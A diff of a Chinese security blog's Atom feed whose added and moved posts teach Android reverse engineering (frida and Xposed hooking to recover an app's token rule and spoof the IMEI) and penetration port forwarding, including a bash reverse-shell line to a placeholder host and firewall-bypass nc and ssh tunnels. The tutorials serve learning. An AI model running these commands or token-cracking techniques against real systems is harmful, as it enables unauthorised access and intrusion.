@@ -83,11 +83,11 @@
   </entry>
   
   <entry>
-    <title>Android逆向第九课 - IDA+frida联合调试</title>
-    <link href="http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B9%9D%E8%AF%BE/"/>
-    <id>http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B9%9D%E8%AF%BE/</id>
+    <title>Android逆向第十课 - IDA+frida联合调试</title>
+    <link href="http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/"/>
+    <id>http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/</id>
     <published>2021-04-18T06:01:51.000Z</published>
-    <updated>2021-08-06T13:44:08.820Z</updated>
+    <updated>2021-08-08T13:29:04.434Z</updated>
     
     <content type="html"><![CDATA[<p>今天，需要做的是通过 IDA和 frida 联合调试，获取请求中的token。我们这是用 X安 app进行演示。</p><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>用fiddler抓包，看一下请求头中的主要内容，确定我们要找的字段是 <code>X-APP-TOKEN</code>。</p><h2 id="apk逆向分析"><a href="#apk逆向分析" class="headerlink" title="apk逆向分析"></a>apk逆向分析</h2><p>首先，我们要去分析apk是否被加固，如果加固了就要进行脱壳，没有加固就直接分析。用 jadx打开apk，可以发现文件的各个目录非常清晰，所以很大程度上并没有加固</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-18.png"></p><p>接下来，我们可以直接在 jadx 中全局查找我们要找的字段，<code>X-APP-TOKEN</code>。（如果找不到的话，我们需要将要查找的字段进行合理分割，分别进行全局查找。）</p><p>我们找到了目标字段后，就可以进入生成<code>X-APP-TOKEN</code>的class，可以最终生成相关字段的代码是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">getAS</span><span class="params">(Context context, String str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">   System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>属于 native 方法, 所以我们需要分析 libnative-lib.so 文件</p><p>先用ida静态分析相关 so 文件，全局查找 <code>getAS </code>方法，无法找到，说明这个方法是被手动注册的，因为手动注册都是通过 <code>JNI_onload</code> 方法，我们可以进行这个方法查看详细信息，确定<code>getAS </code>方法修改后的名字。注意到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegisterNatives(v3, v4, (const JNINativeMethod *)off_DB004, 1)</span><br></pre></td></tr></table></figure><p><code>RegisterNatives</code>是手动注册时调用，那么注册后的方法名肯定在这个方法里面，我们可以使用动态分析的方法获取注册后的方法名。最终可以知道，手动注册后的方法名为 <strong>getAuthString</strong>。<br>（其实手动注册后的方法名肯定还是有含义的，所以也可以 ctrl+f 慢慢找）</p><p>进入 getAuthString 方法，可以看到整个代码非常长，所以直接分析很难，我们首先要关注的是 <strong>返回值</strong>，因为返回值肯定是我们要的 token。</p><blockquote><p>token的一般格式是： timestamp + 固定字符串 + device_id + 其他</p></blockquote><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-19.png"><br>最后，我们发现 token 中还有一个关键信息 与 <code>b64_encode</code> 方法有关，因此我们可以使用 frida hook这个方法，将参数打印出来。</p><p>但是，使用 frida hook某个函数时，一般要用 <code>Module.getExportByName(&#39;.so&#39;,&#39;func_name&#39;)</code>方法，而要 hook 的函数需要被 exports 出来，我们通过 ida 的 Exports 窗口，无法发现 <code>b64_encode</code> 方法，因此不能用这种的方式 hook。</p><p>这里我们采用的方法是，通过<code>b64_encode</code>的绝对地址进行 hook。</p><p>那么，如何使用静态分析找出 <code>b64_encode</code> 的绝对地址呢？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getAuthString_absulate_add = Module.getExportByName(<span class="string">&#x27;libnative-lib.so&#x27;</span>, <span class="string">&#x27;getAuthString&#x27;</span>);</span><br><span class="line"><span class="comment">// 首先获取一个方法的绝对地址</span></span><br><span class="line"><span class="keyword">var</span> native_lib_base_add = <span class="built_in">parseInt</span>(getAuthString_absulate_add) - <span class="built_in">parseInt</span>(<span class="string">&#x27;0x66500&#x27;</span>);</span><br><span class="line"><span class="comment">// 使用 绝对地址 - 相对地址 的方式，获取 so 文件的基地址</span></span><br><span class="line">send(<span class="string">&#x27;native_lib_base_add:&#x27;</span>+ptr(native_lib_base_add));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> md5_init_address = ptr(native_lib_base_add + <span class="built_in">parseInt</span>(<span class="string">&#x27;0x32455&#x27;</span>));</span><br><span class="line"><span class="comment">// 使用 基地址 + 相对地址 的方式，获取目标方法的绝对地址</span></span><br><span class="line">send(<span class="string">&#x27;md5_init_address: &#x27;</span> + md5_init_address);</span><br></pre></td></tr></table></figure><p>最终，我们可以确定 token 的生成规则是：</p><p> token = “token:// 1dek212ddovfkr “+  时间戳 + “$” + device_id + “&amp;” + packagename</p>]]></content>
     
@@ -125,6 +125,28 @@
     
     
     <category term="爬虫" scheme="http://yejuns.github.io/tags/%E7%88%AC%E8%99%AB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Android逆向第九课 - xposed</title>
+    <link href="http://yejuns.github.io/2021/04/01/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B9%9D%E8%AF%BE/"/>
+    <id>http://yejuns.github.io/2021/04/01/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B9%9D%E8%AF%BE/</id>
+    <published>2021-04-01T03:08:51.000Z</published>
+    <updated>2021-08-08T13:38:31.912Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="xposed-原理"><a href="#xposed-原理" class="headerlink" title="xposed 原理"></a>xposed 原理</h2><p>Xposed 是一个 Android 平台上的动态劫持框架，它的原理是替换安卓系统 /system/bin 目录下的 app_process 来控制 zygote 进程，使得app_pross在启动时会加载 XposedBridge.jar，从而实现对zygode进程以及其创建的虚拟机的劫持，最终对系统的某些功能实现接管。</p><p>优点: xpose可以在我们不破坏apk自身的情况下实现对函数的hook，修改函数的参数和返回值，改变函数的结构并执行我们自己的代码,用好了xposed可以对我们的逆向过程起到事半功倍的作用。</p><p>缺点:本身不能对 so 中的函数进行修改 需要结合其他框架。</p><h2 id="开发-xposed-模块过程"><a href="#开发-xposed-模块过程" class="headerlink" title="开发 xposed 模块过程"></a>开发 xposed 模块过程</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>Android-studio是最新版，这边手机和模拟器装的都是 xposed89 的框架，因此 使用的 XposedBridge.jar 也是89版本，<a href="https://github.com/924587628/XposedBridgeAPI">下载地址</a>,</p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>1、在AS中新建项目，然后将 XposedBridgeApi-89.jar放到lib目录下 右键 Add As Library 将jar包添加进依赖</p><p>2、打开项目 src/main目录下的 AndroidManifest.xml文件，在 application 标签里面添加如下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposedmodule&quot;</span><br><span class="line">        android:value=&quot;true&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposeddescription&quot;</span><br><span class="line">        android:value=&quot;Easy example&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposedminversion&quot;</span><br><span class="line">        android:value=&quot;89&quot; /&gt;</span><br></pre></td></tr></table></figure><p>3、打开app目录下的 build.gradle ，将</p><p>compile files(‘libs/XposedBridgeApi-89.jar’)</p><p>更改为</p><p>provided files(‘libs/XposedBridgeApi-89.jar’)</p><p>4、新建Hook入口类 HookMain 实现 xposed 的接口 IXposedHookLoadPackage 并重写方法 handleLoadPackage 如图所示 这个写法格式是固定的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HookMain</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、在 src/main/assets 下新建文件 xposed_init 并将 HookMain 类作为hook的主入口类以<strong>包名+类名</strong>的格式写进去。</p><p>6、检测hook环境是否配置成功，打开项目的MainActivity类并写一个getIMEI方法获取当前系统的imei并在程序运行的时候打印出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.layout);</span><br><span class="line">        Log.i(<span class="string">&quot;手机的imei是&quot;</span>,getIMEI(<span class="keyword">this</span>));</span><br><span class="line">        Toast.makeText(getApplicationContext(),<span class="string">&quot;手机的imei是&quot;</span>+getIMEI(<span class="keyword">this</span>),Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title">getIMEI</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//实例化TelephonyManager对象</span></span><br><span class="line">            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line">            <span class="comment">//获取IMEI号</span></span><br><span class="line">            String imei = telephonyManager.getDeviceId();</span><br><span class="line">            <span class="keyword">if</span> (imei == <span class="keyword">null</span>) &#123;</span><br><span class="line">                imei = <span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> imei + <span class="string">&quot;yeyeye&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/xposed-4.png"></p><p><em>我这边用真机一直没有hook成功，在模拟器上却成功了，不知道是什么原因。</em></p><p>7、环境没问题后，我们就可以使用xposed修改部分修改手机的IMEI号，Hook一个函数需要满足三个条件:</p><ul><li>方法的包名+类名</li><li>方法名</li><li>方法的参数类型</li></ul><p>所以我这边hook的代码是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HookMain</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">         <span class="comment">//固定格式</span></span><br><span class="line">        findAndHookMethod(</span><br><span class="line">                <span class="string">&quot;android.telephony.TelephonyManager&quot;</span>,  <span class="comment">//要hook的包名+类名</span></span><br><span class="line">                lpparam.classLoader,                   <span class="comment">//classLoader固定</span></span><br><span class="line">                <span class="string">&quot;getDeviceId&quot;</span>,                         <span class="comment">//要hook的方法名</span></span><br><span class="line">                                                       <span class="comment">//方法参数 没有就不填</span></span><br><span class="line">                <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="comment">//方法执行前执行</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//方法执行后执行,改方法的返回值一定要在方法执行完毕后更改</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span></span></span><br><span class="line"><span class="function">                            <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                        param.setResult(<span class="string">&quot;355888888888888&quot;</span>);</span><br><span class="line"> </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=850885&amp;highlight=xposed">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=850885&amp;highlight=xposed</a></p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;xposed-原理&quot;&gt;&lt;a href=&quot;#xposed-原理&quot; class=&quot;headerlink&quot; title=&quot;xposed 原理&quot;&gt;&lt;/a&gt;xposed 原理&lt;/h2&gt;&lt;p&gt;Xposed 是一个 Android 平台上的动态劫持框架，它的原理是替换安卓系统 </summary>
+      
+    
+    
+    
+    
+    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
     
   </entry>
   
@@ -336,28 +358,6 @@
   </entry>
   
   <entry>
-    <title>渗透之端口转发</title>
-    <link href="http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
-    <id>http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
-    <published>2021-03-12T08:01:51.000Z</published>
-    <updated>2021-08-01T02:48:52.718Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题：</p><ol><li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙</li><li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口</li></ol><p>常用的方法有</p><p><code>nc、lcx、socks、bash反弹、MSF后门反弹、frp</code></p><h2 id="nc端口转发"><a href="#nc端口转发" class="headerlink" title="nc端口转发"></a>nc端口转发</h2><p>背景：192.168.50.1的用户ye需要访问192.168.50.2的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前ye用户只能访问192.168.50.2的9000端口。需要9000端口做转发。 </p><ol><li>在192.168.50.2上开启8000端口<br><code>nc -l 8000</code></li><li>在192.168.50.2上实现9000端口转发<br><code>cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo</code></li><li>在192.168.50.1上连接192.168.50.2的9000端口<br><code>nc -vn 192.168.50.2 9000</code></li></ol><h2 id="Shell命令实现端口转发"><a href="#Shell命令实现端口转发" class="headerlink" title="Shell命令实现端口转发"></a>Shell命令实现端口转发</h2><ol><li>部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 9987:10.154.62.197:3306 root@localhost </span><br><span class="line"><span class="meta">#</span><span class="bash"> 9987是本地创建的一个端口要把10.154.62.197服务器上的3306端口映射到本地的9987</span></span><br><span class="line">ssh -CfNg -R 1521:127.0.0.1:6300 root@localhost</span><br><span class="line"><span class="meta">#</span><span class="bash"> 作用同上, 只是在远程主机172.16.1.164上打开1521端口, 来映射本机的6300端口.</span></span><br></pre></td></tr></table></figure>案例：有A,B,C 3台服务器, A,C有公网IP, B是某IDC的服务器无公网IP. A通过B连接C的80端口(A&lt;=&gt;B&lt;=&gt;C), 那么在B上执行如下命令即可</li></ol><p>ssh -CfNg -L 6300:127.0.0.1:80 userc@C</p><p>ssh -CfNg -R 80:127.0.0.1:6300 usera@A</p><p>服务器A和服务器C之间, 利用跳板服务器B建立了加密隧道. 在A上连接127.0.0.1:80, 就等同C上的80端口. 需要注意的是, 服务器B上的6300端口的数据没有加密, 可被监听, 例:</p><p>tcpdump -s 0 -i lo port 6300</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;端口转发&quot;&gt;&lt;a href=&quot;#端口转发&quot; class=&quot;headerlink&quot; title=&quot;端口转发&quot;&gt;&lt;/a&gt;端口转发&lt;/h2&gt;&lt;p&gt;在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很</summary>
-      
-    
-    
-    
-    
-    <category term="渗透" scheme="http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
     <title>web安全之信息收集</title>
     <link href="http://yejuns.github.io/2021/03/11/wen%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
     <id>http://yejuns.github.io/2021/03/11/wen%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
@@ -425,6 +425,28 @@
   </entry>
   
   <entry>
+    <title>渗透之端口转发</title>
+    <link href="http://yejuns.github.io/2021/01/22/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
+    <id>http://yejuns.github.io/2021/01/22/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
+    <published>2021-01-22T08:01:51.000Z</published>
+    <updated>2021-08-08T03:00:43.702Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题：</p><ol><li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙</li><li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口</li></ol><p>常用的方法有</p><p><code>nc、lcx、socks、bash反弹、MSF后门反弹、frp</code></p><h2 id="nc端口转发"><a href="#nc端口转发" class="headerlink" title="nc端口转发"></a>nc端口转发</h2><p>背景：192.168.50.1的用户ye需要访问192.168.50.2的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前ye用户只能访问192.168.50.2的9000端口。需要9000端口做转发。 </p><ol><li>在192.168.50.2上开启8000端口<br><code>nc -l 8000</code></li><li>在192.168.50.2上实现9000端口转发<br><code>cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo</code></li><li>在192.168.50.1上连接192.168.50.2的9000端口<br><code>nc -vn 192.168.50.2 9000</code></li></ol><h2 id="Shell命令实现端口转发"><a href="#Shell命令实现端口转发" class="headerlink" title="Shell命令实现端口转发"></a>Shell命令实现端口转发</h2><ol><li>部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 9987:10.154.62.197:3306 root@localhost </span><br><span class="line"><span class="meta">#</span><span class="bash"> 9987是本地创建的一个端口要把10.154.62.197服务器上的3306端口映射到本地的9987</span></span><br><span class="line">ssh -CfNg -R 1521:127.0.0.1:6300 root@localhost</span><br><span class="line"><span class="meta">#</span><span class="bash"> 作用同上, 只是在远程主机172.16.1.164上打开1521端口, 来映射本机的6300端口.</span></span><br></pre></td></tr></table></figure>案例：有A,B,C 3台服务器, A,C有公网IP, B是某IDC的服务器无公网IP. A通过B连接C的80端口(A&lt;=&gt;B&lt;=&gt;C), 那么在B上执行如下命令即可:</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 6300:127.0.0.1:80 userc@C</span><br><span class="line"></span><br><span class="line">ssh -CfNg -R 80:127.0.0.1:6300 usera@A</span><br></pre></td></tr></table></figure><p>服务器A和服务器C之间, 利用跳板服务器B建立了加密隧道. 在A上连接127.0.0.1:80, 就等同C上的80端口. 需要注意的是, 服务器B上的6300端口的数据没有加密, 可被监听, 例:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -s 0 -i lo port 6300</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;端口转发&quot;&gt;&lt;a href=&quot;#端口转发&quot; class=&quot;headerlink&quot; title=&quot;端口转发&quot;&gt;&lt;/a&gt;端口转发&lt;/h2&gt;&lt;p&gt;在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很</summary>
+      
+    
+    
+    
+    
+    <category term="渗透" scheme="http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Linux 中的安全模型</title>
     <link href="http://yejuns.github.io/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/"/>
     <id>http://yejuns.github.io/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/</id>
@@ -443,28 +465,6 @@
     
     
     <category term="Linux安全" scheme="http://yejuns.github.io/tags/Linux%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>burpsuite使用</title>
-    <link href="http://yejuns.github.io/2020/12/31/burpsuite%E4%BD%BF%E7%94%A8/"/>
-    <id>http://yejuns.github.io/2020/12/31/burpsuite%E4%BD%BF%E7%94%A8/</id>
-    <published>2020-12-31T08:01:51.000Z</published>
-    <updated>2021-07-05T00:21:11.994Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h2 id=&quot;-1&quot;&gt;&lt;a href=&quot;#-1&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;</summary>
-      
-    
-    
-    
-    
-    <category term="测试" scheme="http://yejuns.github.io/tags/%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
